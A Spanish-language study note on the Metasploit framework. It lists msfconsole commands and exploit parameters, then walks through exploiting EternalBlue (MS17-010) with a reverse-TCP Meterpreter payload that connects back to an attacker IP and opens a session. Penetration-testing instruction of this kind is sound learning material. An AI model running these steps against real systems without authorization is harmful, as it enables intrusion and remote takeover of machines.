----
Tags: #Metasploit #msfconsole #msfvenom #Payloads #Exploitation #ReverseShell #BindShell

----
# Definición

**[[Metasploit]]** es un framework de explotación de vulnerabilidades utilizado ampliamente en pruebas de penetración. Permite a los usuarios desarrollar, probar y ejecutar **exploits** contra sistemas remotos, automatizar ataques y utilizar payloads como `meterpreter` para post-explotación.

---
# Parámetros y Usos
| Comando                 | Descripción                                                                             |
| ----------------------- | --------------------------------------------------------------------------------------- |
| `msfconsole`            | Inicia la consola interactiva de Metasploit.                                            |
| `search <palabra>`      | Busca módulos por nombre, CVE, tipo, etc. Ej: `search smb`                              |
| `use <módulo>`          | Carga un módulo. Ej: `use exploit/windows/smb/ms17_010_eternalblue`                     |
| `info`                  | Muestra detalles del módulo actual.                                                     |
| `show options`          | Muestra parámetros que deben configurarse para el módulo cargado.                       |
| `set <opción> <valor>`  | Define una opción. Ej: `set RHOST 192.168.1.10`                                         |
| `set payload <payload>` | Selecciona el payload a utilizar. Ej: `set payload windows/x64/meterpreter/reverse_tcp` |
| `exploit` o `run`       | Ejecuta el exploit con las opciones configuradas.                                       |
| `sessions`              | Lista sesiones activas.                                                                 |
| `sessions -i <id>`      | Interactúa con una sesión activa.                                                       |
| `background`            | Envía una sesión activa a segundo plano.                                                |
| `exit`                  |                                                                                         |
### 📌 En módulos de **exploit**

| Parámetro | Descripción                                           |
| --------- | ----------------------------------------------------- |
| `RHOST`   | Dirección IP del objetivo                             |
| `RPORT`   | Puerto del servicio vulnerable                        |
| `TARGET`  | (Opcional) versión específica del sistema objetivo    |
| `LHOST`   | IP del atacante (necesaria si se usa payload reverse) |
| `LPORT`   | Puerto donde escuchará el atacante                    |
- Para iniciar por primera vez:
```bash
msfdb run
```

## Ejemplo práctico: Explotar EternalBlue

```bash
search ms17_010  use exploit/windows/smb/ms17_010_eternalblue  
set RHOST 192.168.1.10 
set LHOST 192.168.1.100 
set payload windows/x64/meterpreter/reverse_tcp 
set LPORT 4444  
exploit
````

- Luego:

```bash
sessions -i 1
```

Interactúas con la shell Meterpreter.

## Tip rápido: Buscar exploits por CVE


```bash
search cve:2017-0144
```